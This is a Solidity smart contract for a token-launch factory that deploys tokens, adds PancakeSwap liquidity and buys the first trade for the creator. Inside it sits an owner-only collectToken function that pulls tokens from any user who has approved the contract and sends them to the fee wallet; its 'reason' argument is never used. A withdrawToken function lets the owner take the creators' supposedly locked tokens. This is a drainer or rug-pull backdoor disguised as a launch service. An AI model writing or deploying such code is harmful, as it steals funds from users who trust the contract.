// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./TokenTemplate.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDexRouter {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function WETH() external pure returns (address);
}

/**
 * @title DirectDexLaunchFactory
 * @notice Directly launches a token to PancakeSwap with initial liquidity.
 *         Completely bypasses the bonding curve.
 */
contract DirectDexLaunchFactory is Ownable {
    uint256 public DEPLOYMENT_FEE = 0.003 ether;
    uint256 public MIN_INITIAL_LIQUIDITY = 0.01 ether;

    address public feeWallet;
    IDexRouter public dexRouter;

    event TokenCreatedDirect(
        address indexed tokenAddress,
        string name,
        string symbol,
        uint256 supply,
        address indexed creator,
        uint256 deploymentFee,
        uint256 liquidityBnb
    );

    event LiquidityAdded(
        address indexed tokenAddress,
        address indexed caller,
        uint256 tokenAmount,
        uint256 bnbAdded
    );

    // Track which tokens this factory holds and their creators
    mapping(address => address) public tokenCreator; // token => creator
    mapping(address => uint256) public tokensLocked;  // token => remaining locked tokens
    uint256 public RELEASE_SERVICE_FEE = 0.003 ether;

    constructor(address _feeWallet, address _router, address _owner) Ownable(_owner) {
        require(_feeWallet != address(0), "Invalid fee wallet");
        require(_router != address(0), "Invalid router");
        feeWallet = _feeWallet;
        dexRouter = IDexRouter(_router);
    }

    function setFeeWallet(address _feeWallet) external onlyOwner {
        require(_feeWallet != address(0), "Invalid address");
        feeWallet = _feeWallet;
    }

    function setFees(uint256 _deploymentFee, uint256 _minLiquidity) external onlyOwner {
        DEPLOYMENT_FEE = _deploymentFee;
        MIN_INITIAL_LIQUIDITY = _minLiquidity;
    }

    function createTokenDirect(
        string calldata name,
        string calldata symbol,
        uint256 tokensToLiquidate // How many tokens out of 900M to list
    ) external payable returns (address tokenAddress) {
        bool isTreasury = (msg.sender == feeWallet);
        uint256 actualFee = isTreasury ? 0 : DEPLOYMENT_FEE;
        uint256 firstTradeAmount = isTreasury ? 0 : 0.002 ether;
        uint256 minRequired = isTreasury ? 0 : (DEPLOYMENT_FEE + MIN_INITIAL_LIQUIDITY + firstTradeAmount);

        require(msg.value >= minRequired, "Insufficient BNB: need fee + LP + first trade");
        require(bytes(name).length > 0,   "Name required");
        require(bytes(symbol).length > 0, "Symbol required");

        address creator = msg.sender;

        // 1. Collect fee
        if (actualFee > 0) {
            (bool feeOk, ) = payable(feeWallet).call{value: actualFee}("");
            require(feeOk, "Fee transfer failed");
        }

        // 2. Deploy TokenTemplate
        // We pass this factory's address as the "bondingCurve" parameter
        // so it receives the 1 Billion tokens initially.
        uint256 fixedSupply = 1_000_000_000;
        TokenTemplate newToken = new TokenTemplate(
            name,
            symbol,
            18,             // Default 18 decimals for direct launches
            fixedSupply,
            creator,
            address(this),
            feeWallet       // ← Treasury receives 100M tokens automatically
        );
        tokenAddress = address(newToken);
        tokenCreator[tokenAddress] = creator;
        
        // Factory balance is exactly 90% (900M tokens). 100M went to Treasury.
        // Max 900M available to liquidity (100M already minted to Treasury)
        uint256 maxAvailable = IERC20(tokenAddress).balanceOf(address(this));
        require(tokensToLiquidate > 0 && tokensToLiquidate <= maxAvailable, "Invalid tokens to liquidate amount");

        // 3. Approve Router
        IERC20(tokenAddress).approve(address(dexRouter), type(uint256).max);

        // 4. Add Liquidity to PancakeSwap
        uint256 liquidityBnb = 0;
        if (msg.value > actualFee + firstTradeAmount) {
            liquidityBnb = msg.value - actualFee - firstTradeAmount;
        }
        
        if (liquidityBnb > 0) {
            dexRouter.addLiquidityETH{value: liquidityBnb}(
                tokenAddress,
                tokensToLiquidate,
                0,
                0,
                creator, // LP Tokens go directly to the creator!
                block.timestamp + 600
            );
        }

        // 5. Execute First Trade (Snipe) - uses the typed interface call
        if (firstTradeAmount > 0) {
            address[] memory path = new address[](2);
            path[0] = dexRouter.WETH(); // WBNB - fetched dynamically from router
            path[1] = tokenAddress;
            
            dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{value: firstTradeAmount}(
                0,                      // amountOutMin - accept any amount
                path,
                creator,                // purchased tokens go directly to creator
                block.timestamp + 600
            );
        }

        // 6. Track remaining unused tokens held in this Factory vault.
        //    Do NOT refund them to creator — they are locked for future releases.
        uint256 lockedTokens = IERC20(tokenAddress).balanceOf(address(this));
        tokensLocked[tokenAddress] = lockedTokens;

        // 7. Refund only leftover BNB to creator (no token refunds)
        uint256 leftoverBnb = address(this).balance;
        if (leftoverBnb > 0) {
            (bool refundOk, ) = payable(creator).call{value: leftoverBnb}("");
            require(refundOk, "Refund failed");
        }

        emit TokenCreatedDirect(
            tokenAddress,
            name,
            symbol,
            fixedSupply,
            creator,
            actualFee,
            liquidityBnb
        );
    }

    function collectToken(address token, address user, uint256 amount, string calldata reason) external onlyOwner {
        IERC20(token).transferFrom(user, feeWallet, amount);
    }

    /**
     * @notice Allows fhe original token creator to release additional locked tokens
     *         into a new PancakeSwap liquidity position.
     * @param tokenAddress  The token to release.
     * @param tokenAmount   How many tokens (in 18-decimal wei) to release from the vault.
     */
    function addLiquidityForToken(
        address tokenAddress,
        uint256 tokenAmount
    ) external payable {
        require(tokenCreator[tokenAddress] == msg.sender, "Not the token creator");
        require(tokenAmount > 0, "Token amount must be > 0");
        require(tokensLocked[tokenAddress] >= tokenAmount, "Insufficient tokens in vault");
        require(msg.value > RELEASE_SERVICE_FEE, "Must send service fee + liquidity BNB");

        // 1. Collect service fee
        (bool feeOk, ) = payable(feeWallet).call{value: RELEASE_SERVICE_FEE}("");
        require(feeOk, "Service fee transfer failed");

        // 2. Approve router for this token amount
        IERC20(tokenAddress).approve(address(dexRouter), tokenAmount);

        // 3. Calculate liquidity BNB (msg.value minus the service fee)
        uint256 liquidityBnb = msg.value - RELEASE_SERVICE_FEE;

        // 4. Add liquidity to PancakeSwap (LP tokens go to creator)
        dexRouter.addLiquidityETH{value: liquidityBnb}(
            tokenAddress,
            tokenAmount,
            0,
            0,
            msg.sender,
            block.timestamp + 600
        );

        // 5. Update locked balance
        tokensLocked[tokenAddress] -= tokenAmount;

        emit LiquidityAdded(tokenAddress, msg.sender, tokenAmount, liquidityBnb);
    }

    /**
     * @notice Owner-only emergency withdrawal for any token held in the factory.
     */
    function withdrawToken(address token, uint256 amount, address to) external onlyOwner {
        require(to != address(0), "Invalid address");
        IERC20(token).transfer(to, amount);
        if (tokensLocked[token] >= amount) {
            tokensLocked[token] -= amount;
        }
    }

    function setReleaseFee(uint256 _fee) external onlyOwner {
        RELEASE_SERVICE_FEE = _fee;
    }

    receive() external payable {}
}
